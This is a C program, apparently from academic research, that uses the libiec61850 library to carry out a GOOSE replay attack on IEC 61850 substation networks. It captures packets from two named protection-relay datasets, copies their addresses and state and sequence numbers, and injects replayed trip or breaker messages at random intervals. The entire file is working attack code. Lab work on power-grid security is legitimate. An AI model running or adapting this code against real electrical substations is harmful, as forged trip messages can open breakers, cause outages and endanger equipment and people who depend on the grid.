/*This was coded by Johnatan Oliveira for academic purposes and uses functions and libraries of functions
from the libiec61850 library for GOOSE message handling and network 
monitoring by Michael Zillgith https://libiec61850.com/, the libIEC61850 is released under the GPLv3. */

#include "goose_receiver.h"
#include "goose_subscriber.h"
#include "hal_thread.h"
#include "mms_value.h"
#include "goose_publisher.h"
#include <time.h>

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

static int running = 1;

int numero = 5;
int cont = 0;
int* ponteiro;

//char vlanTag;
int16_t vlanId;
int8_t vlanPrio;
int32_t appId;

//Variables to store the source MAC address
uint8_t macBuf[6];
uint8_t macsrcBuf[6];
uint8_t macsrcBuf1;
uint8_t macsrcBuf2;
uint8_t macsrcBuf3;
uint8_t macsrcBuf4;
uint8_t macsrcBuf5;
uint8_t macsrcBuf6;

//Variables to store the destination MAC address
uint8_t macdstBuf1;
uint8_t macdstBuf2;
uint8_t macdstBuf3;
uint8_t macdstBuf4;
uint8_t macdstBuf5;
uint8_t macdstBuf6;


//Variables for GOOSE protocol parameters
char goId[60];
char goCbRef[60];
char dataSet[60];
uint32_t confRev;
char ndsCom[60];
char simul[60];
uint32_t stNum;
uint32_t sqNum;
uint32_t timeToLive;
uint64_t timestamp;
bool dataset_valores[3];
int quantidade_dados=0;
int total_msg = 0;
int aleatorio = 0;
int cont_msg_IED1 = 0;
int cont_msg_IED2 = 0;

//
int MmsValue_getdataset(const MmsValue* self, bool* buffer)
{

    int arraySize = MmsValue_getArraySize(self);
    int i;
    int cont_dados = 0;
    for (i = 0; i < arraySize; i++) {
        buffer[i] = MmsValue_getBoolean(MmsValue_getElement(self, i));
        cont_dados += 1;
    }
    return cont_dados;
}


void sigint_handler(int signalId)
{
    running = 0;
}

//Function that establishes network monitoring to capture the packet of a dataset determined by the attacker
void
gooseListener(GooseSubscriber assinante, void* parametro)
{
    if (cont == 0) {


        //Capture of the packet dataset
        strcpy(dataSet, GooseSubscriber_getDataSet(assinante));

        //Stores the source address present in the packet.
        GooseSubscriber_getSrcMac(assinante, macsrcBuf);
        macsrcBuf1 = macsrcBuf[0];
        macsrcBuf2 = macsrcBuf[1];
        macsrcBuf3 = macsrcBuf[2];
        macsrcBuf4 = macsrcBuf[3];
        macsrcBuf5 = macsrcBuf[4];
        macsrcBuf6 = macsrcBuf[5];

        //Stores the source address present in the packet
        GooseSubscriber_getDstMac(assinante, macBuf);
        macdstBuf1 = macBuf[0];
        macdstBuf2 = macBuf[1];
        macdstBuf3 = macBuf[2];
        macdstBuf4 = macBuf[3];
        macdstBuf5 = macBuf[4];
        macdstBuf6 = macBuf[5];

        //Stores the value of the goId parameter from the GOOSE packet
        strcpy(goId, GooseSubscriber_getGoId(assinante));

        //Stores the value of the **goCbRef** parameter from the GOOSE packet.
        strcpy(goCbRef, GooseSubscriber_getGoCbRef(assinante));

        //Stores the value of the **dataset** parameter from the GOOSE packet.
        strcpy(dataSet, GooseSubscriber_getDataSet(assinante));

        //Stores the value of the **appId** parameter from the GOOSE packet.
        appId = GooseSubscriber_getAppId(assinante);

        //Stores the value of the stnum parameter from the GOOSE packet.
        stNum = GooseSubscriber_getStNum(assinante);

        //Stores the value of the **sqnum** parameter from the GOOSE packet.
        sqNum = GooseSubscriber_getSqNum(assinante);

        //Stores the value of the **timeToLive** parameter from the GOOSE packet.
        timeToLive = GooseSubscriber_getTimeAllowedToLive(assinante);

        //Stores the value of the **confRev** parameter from the GOOSE packet.
        confRev = GooseSubscriber_getConfRev(assinante);

        //Stores the value of the **timestamp** parameter from the GOOSE packet.
        timestamp = GooseSubscriber_getTimestamp(assinante);

        MmsValue* values = GooseSubscriber_getDataSetValues(assinante);
        quantidade_dados = MmsValue_getdataset(values, dataset_valores);

        //Comparison of the captured packet datasets with what was determined by the attacker.
        if ((((aleatorio % 2 == 0 && cont_msg_IED1 < 50) || (cont_msg_IED2 >= 50 && cont_msg_IED1 < 50))) && (!strcmp(dataSet, "SEL_421_distCFG/LLN0$dataset_disj")))
        {
            //Counts the number of monitored packets that had the same dataset.
            if (dataset_valores[0] == true || dataset_valores[2] == true) {
                cont += 1;
                aleatorio += 1;
            }

        }
        else if ((((aleatorio % 2 != 0 && cont_msg_IED2 < 50) || (cont_msg_IED1 >= 50 && cont_msg_IED2 < 50))) && (!strcmp(dataSet, "ied_protecaoPROT/LLN0$trip2_dataset"))) {

            //Counts the number of monitored packets that had the same dataset.
            if (dataset_valores[0] == true || dataset_valores[2] == true) {
                cont += 1;
                aleatorio += 1;
            }


        }
    }
}

int
main(int argc, char** argv)
{
    int intervalo_set = 0;
    int cont_msg = 0;

    GooseReceiver monitoramento = GooseReceiver_create();


    //Condition present in the example code of the Goose publisher from the libiec61850 library to verify the use of the network interface.
    if (argc > 1) {
        printf("Set interface id: %s\n", argv[1]);
        GooseReceiver_setInterfaceId(monitoramento, argv[1]);
    }
    else {
        //On the machine used in the experiment, interface 3 was used.
        printf("Using interface 3\n");
        GooseReceiver_setInterfaceId(monitoramento, "4");
    }

    //Functions for configuring the libiec61850 library for monitoring and capturing GOOSE packets from the network
    GooseSubscriber assinante = GooseSubscriber_create("", NULL);
    GooseSubscriber_setObserver(assinante);
    GooseSubscriber_setListener(assinante, gooseListener, NULL);
    GooseReceiver_addSubscriber(monitoramento, assinante);
    GooseReceiver_start(monitoramento);

    //Interval of the number of intercepted messages to be used in the random selection of the message to be modified in the attack.
    int intervalo_inf = 1, intervalo_sup = 20;
    int n_mensagens_inf = 1, n_mensagens_sup = 10;
    int n_mensagens = 0;
    srand(time(NULL));

    if (GooseReceiver_isRunning(monitoramento)) {
        signal(SIGINT, sigint_handler);
        while (running) {

            n_mensagens = (rand() % (n_mensagens_sup - n_mensagens_inf + 1) + n_mensagens_inf);

   
            int j = 0;
            //If the value of the packet count captured with the dataset determined by the attacker is equal to the randomly chosen value, the attack will begin with the last captured packet.
            if (cont == 1) {
                //Displays on the screen the confirmation that the count is equal to the randomly assigned value.
                printf("Ataque iniciado");
                printf("\nAtaque iniciado. Mensagens: %d \n", n_mensagens);
                printf("Qtd dados: %d \n", quantidade_dados);
                printf("total_msg: %d \n", total_msg);
                printf("cont_msg_IED1: %d \n", cont_msg_IED1);
                printf("cont_msg_IED2 %d \n", cont_msg_IED2);
                printf("dataSet %s \n", dataSet);
                printf("aleatorio %d \n", aleatorio);

                //Creation of dataset
                LinkedList valores_dataset = LinkedList_create();

                // Define the dataset of the attack packet – by the attacker.
                int k = 0;
                for (k = 0; k < quantidade_dados; k++) {
                    LinkedList_add(valores_dataset, MmsValue_newBoolean(dataset_valores[k]));
                }
                quantidade_dados = 0;

                //Insertion of the destination MAC address values of the subscriber of the GOOSE message.
                CommParameters gooseCommParameters;

                gooseCommParameters.srcAddress[0] = macsrcBuf1;
                gooseCommParameters.srcAddress[1] = macsrcBuf2;
                gooseCommParameters.srcAddress[2] = macsrcBuf3;
                gooseCommParameters.srcAddress[3] = macsrcBuf4;
                gooseCommParameters.srcAddress[4] = macsrcBuf5;
                gooseCommParameters.srcAddress[5] = macsrcBuf6;

                //Insertion of the destination MAC address values of the subscriber of the GOOSE message.
                gooseCommParameters.appId = appId;
                gooseCommParameters.dstAddress[0] = macdstBuf1;
                gooseCommParameters.dstAddress[1] = macdstBuf2;
                gooseCommParameters.dstAddress[2] = macdstBuf3;
                gooseCommParameters.dstAddress[3] = macdstBuf4;
                gooseCommParameters.dstAddress[4] = macdstBuf5;
                gooseCommParameters.dstAddress[5] = macdstBuf6;
                gooseCommParameters.vlanId = 1;
                gooseCommParameters.vlanPriority = 4;

                gooseCommParameters.time_set = true;
                gooseCommParameters.src_timestamp = timestamp;

                char* interface;

                //Interface determination - function present in the example from the libiec61850 library.
                if (argc > 1)
                    interface = argv[1];
                else
                    interface = "4";

                //Insertion of the values extracted from the original packet into the attack packet to be injected.
                GoosePublisher publicador = GoosePublisher_create(&gooseCommParameters, interface);
                GoosePublisher_setDataSetRef(publicador, dataSet);
                GoosePublisher_setGoCbRef(publicador, goCbRef);
                GoosePublisher_setConfRev(publicador, confRev);
                GoosePublisher_setGoID(publicador, goId);
                GoosePublisher_setTimeAllowedToLive(publicador, timeToLive);

                //REPLAY ATTACK – unlike the masquerade attack, the sqnum and stnum parameters are kept the same as in the original message.
                for (j = 0; j < n_mensagens; j++) {
                    
                    if (!strcmp(dataSet,"SEL_421_distCFG/LLN0$dataset_disj") && cont_msg_IED1 < 50){
                        //Maintains the same value of sqnum.
                        GoosePublisher_setSqNum(publicador, sqNum);

                        //Maintains the same value of **stnum**.
                        GoosePublisher_setStNum(publicador, stNum);

                        int intervalo_sup_sleep = 30000, intervalo_inf_sleep = 5000, intervalo_sleep = 0;
                        intervalo_sleep = (rand() % (intervalo_sup_sleep - intervalo_inf_sleep + 1) + intervalo_inf_sleep);
                        Thread_sleep(intervalo_sleep);

                        //Immediate injection of the attack packet into the network
                        GoosePublisher_publish(publicador, valores_dataset);
                        printf("\nMensagem: %d\n", n_mensagens);
                       
                        total_msg += 1;
                        cont_msg_IED1 += 1;
                    }
                    else if((!strcmp(dataSet,"ied_protecaoPROT/LLN0$trip2_dataset")) && cont_msg_IED2 < 50){
                        //Maintains the same value of sqnum
                        GoosePublisher_setSqNum(publicador, sqNum);

                        //Maintains the same value of **stnum**
                        GoosePublisher_setStNum(publicador, stNum);

                        int intervalo_sup_sleep = 30000, intervalo_inf_sleep = 5000, intervalo_sleep = 0;
                        intervalo_sleep = (rand() % (intervalo_sup_sleep - intervalo_inf_sleep + 1) + intervalo_inf_sleep);
                        Thread_sleep(intervalo_sleep);

                        //Immediate injection of the attack packet into the network
                        GoosePublisher_publish(publicador, valores_dataset);
                        printf("\nMensagem: %d\n", n_mensagens);
                        
                        total_msg += 1;
                        cont_msg_IED2 += 1;
                    }

                    
                }

                GoosePublisher_destroy(publicador);
                cont = 0;
                printf("\nProximo ataque\n");
                
            }
            else {
             
            }

            if (total_msg >= 100) {
                break;
            }
        }
    }
    else {
        printf("Falha na comunicacao GOOSE\n");
    }

    //Monitoring termination
    GooseReceiver_stop(monitoramento);
    GooseReceiver_destroy(monitoramento);

    return 0;
}